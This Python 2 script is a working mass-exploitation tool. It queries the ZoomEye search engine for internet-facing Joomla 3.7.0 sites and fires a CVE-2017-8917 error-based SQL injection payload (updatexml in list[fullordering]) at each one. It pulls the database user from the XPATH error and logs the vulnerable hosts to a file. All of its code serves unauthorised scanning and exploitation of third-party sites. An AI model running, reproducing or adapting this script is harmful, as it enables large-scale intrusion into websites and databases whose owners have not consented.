# -*- coding: utf-8 -*-
import requests
import json
import re
import warnings
warnings.simplefilter("ignore")

zoomeye_api_auth_url = "https://api.zoomeye.org/user/login"
zoomeye_api_search_url = "https://api.zoomeye.org/web/search?query=app:joomla%20ver:3.7.0"


def logging(file, content):
    f = open(file, 'a')
    f.write(content + '\n')
    f.close()

def get_zoomeye_auth():
    print "[*] Please config your ZoomEye API..."
    username = raw_input("Please input your ZoomEye username: ")
    password = raw_input("Please input your ZoomEye password: ")
    data = { 'username': username.strip(),
             'password': password.strip()
           }
    res = requests.post(url = zoomeye_api_auth_url, data = json.dumps(data))
    if res.status_code == 200:
        access_token = json.loads(res.content)['access_token']
        headers = {"Authorization": "JWT %s" % str(access_token)}
        return headers
    else:
        return ''

def grep_info(url, text):
    if "XPATH syntax error: &#039;" in text:
        reg = ".*XPATH syntax error: &#039;(.*?)&#039;</title>.*"
    else:
        reg = ".*XPATH syntax error: '(.*?)'.*"
    match = re.search(reg, text)
    if match:
        return 'vulnerable, user: %s' % match.group(1)
    else:
        return 'not vulnerable!'

def exploit(url):
    payload = '%s/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(1,user()),1)' % url
    try:
        res = requests.get(url = payload, verify = False, timeout = 5)
        if res.status_code == 500:
            return '%s, %s' % (url, grep_info(url, res.content))
        else:
            return '%s, unreachable!' % (url)
    except Exception:
        return '%s, unreachable!' % (url)

def generate_search_url(search_url, page_no):
    return "%s&page=%s" % (search_url, page_no)

def batch_scan():
    headers = get_zoomeye_auth()
    print "\n"
    if headers:
        print "[*]Scanning SQL Injection for Joomla 3.7.0 (CVE-2017-8917)..."
        for i in range(1, 1000):
            url = generate_search_url(zoomeye_api_search_url, i)
            response = requests.get(url = url, headers = headers, verify = False)
            if response.status_code == 200:
                a = json.loads(response.content)
                if a['matches']:
                    for match in a['matches']:
                        for webapp in match['webapp']:
                            url = webapp['url'].strip()
                            result = exploit(url)
                            if ", vulnerable" in result:
                                logging('vulnerable.txt', result)
                                print result
    else:
        print "Your ZoomEye authentication failed, please try again!"

if __name__ == "__main__":
    batch_scan() 
